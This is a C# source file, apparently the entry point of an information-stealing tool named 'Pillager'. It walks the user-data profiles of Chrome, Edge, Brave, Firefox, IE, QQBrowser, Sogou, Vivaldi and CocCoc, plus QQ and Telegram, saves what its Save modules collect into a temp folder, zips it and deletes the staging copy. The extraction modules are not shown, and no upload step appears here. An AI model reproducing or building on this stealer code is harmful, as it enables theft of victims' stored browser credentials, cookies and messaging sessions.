using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using Pillager.Browsers;
using Pillager.IM;

namespace Pillager
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
            string savezippath = savepath + ".zip";
            if (Directory.Exists(savepath)) Directory.Delete(savepath, true);
            if (File.Exists(savezippath)) File.Delete(savezippath);
            Directory.CreateDirectory(savepath);

            QQ.Save(savepath);

            Telegram.Save(savepath);

            //IE
            IE.Save(savepath);

            //SogouExplorer < 12.x
            OldSogou.Save(savepath);

            //FireFox
            FireFox.Save(savepath);

            //Chrome
            List<List<string>> browserOnChromium = new List<List<string>>()
            {
                new List<string>() { "Chrome", "Google\\Chrome\\User Data\\Default" } ,
                new List<string>() { "Chrome Beta", "Google\\Chrome Beta\\User Data\\Default" } ,
                new List<string>() { "Chromium", "Chromium\\User Data\\Default" } ,
                new List<string>() { "Edge", "Microsoft\\Edge\\User Data\\Default" } ,
                new List<string>() { "Brave-Browser", "BraveSoftware\\Brave-Browser\\User Data\\Default" } ,
                new List<string>() { "QQBrowser", "Tencent\\QQBrowser\\User Data\\Default" } ,
                new List<string>() { "SogouExplorer", "Sogou\\SogouExplorer\\User Data\\Default" } ,
                new List<string>() { "Vivaldi", "Vivaldi\\User Data\\Default" } ,
                new List<string>() { "CocCoc", "CocCoc\\Browser\\User Data\\Default" } 
                //new List<string>() { "", "" } ,
            };
            foreach (List<string> browser in browserOnChromium)
            {
                string chromepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                browser[1]);
                Chrome chrome = new Chrome(browser[0], chromepath);
                chrome.Save(savepath);                
            }

            //ZIP
            ZipFile.CreateFromDirectory(savepath, savezippath);
            Directory.Delete(savepath, true);
        }
    }
}
